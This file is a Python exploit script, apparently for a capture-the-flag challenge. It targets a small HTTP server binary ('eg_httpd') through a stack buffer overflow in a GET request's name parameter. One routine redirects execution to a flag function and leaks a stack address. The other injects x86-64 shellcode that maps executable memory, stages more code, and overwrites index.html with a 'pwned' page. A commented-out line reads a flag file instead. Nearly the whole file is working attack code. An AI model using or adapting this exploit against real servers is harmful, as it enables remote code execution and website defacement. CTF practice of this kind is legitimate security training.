#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
#  set_remote_libc('libc.so.6')
context.log_level = 'debug'
context.arch='amd64'

io: tube = gift.io
#  elf: ELF = gift.elf
elf = ELF("./eg_httpd")
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def get_payload(name):
	payload = b"GET /index.html?name=" + name
	payload += b" HTTP/1.1\r\n"
	payload += b"\r\n"
	payload += b"\r\n"
	return payload

buf_addr = 0x7ffcfe4e4530
def flag1():
    global buf_addr
    s(get_payload(b"a"*0xd8 + p64(elf.sym["flag1"])))
    #  buf = 0x7ffe08e87100
    #  buf = leak_addr + 8
    ru(b"Good job! Here's your flag: ")
    flag1_text = ru(b'Let me give you another gift: ', drop=True)
    buf_addr = int(rn(14), 16) + 8
    success(flag1_text.decode())
    lg("buf_addr")

def flag2(sc_addr):
    shellcode = asm('''
        /* mmap(addr=0, length=0x1000, prot=7, flags=0x22, fd=0, offset=0) */
        push 0x22
        pop r10
        xor r8d, r8d /* 0 */
        xor r9d, r9d /* 0 */
        xor edi, edi /* 0 */
        push 7
        pop rdx
        mov esi, 0x1010101 /* 4096 == 0x1000 */
        xor esi, 0x1011101
        /* call mmap() */
        push 3 /* 9 */
        pop rax
        add rax, 6
        syscall
        mov r8, rax
    ''')
    shellcode += asm('''
        cld
        xor ecx, ecx
        mov cl, 0xff
        mov rdi, r8
        mov rsi, rsp
        sub rsi, 0x7f
        sub rsi, 35
        rep movsb
    ''')
    shellcode += asm('call r8;')

    #  shellcode += asm(shellcraft.open("./resources/flag.txt", 0, 0)) + asm('mov r9, rax;')
    #  shellcode += asm(shellcraft.sendfile(7, 'r9', 0, 0x100))
    #  print(len(shellcode))

    shellcode += asm(shellcraft.open("./resources/index.html", 2, 0)) + asm('mov r9, rax;')
    to_write = "<center><h1>pwned</h1></center>"
    shellcode += asm(shellcraft.write('r9', to_write, len(to_write)))

    s(get_payload(shellcode.ljust(0xd8, b'\x90') + p64(sc_addr)))


#  flag1()

buf_addr = 0x7ffc7392b180
flag2(buf_addr)

ia()
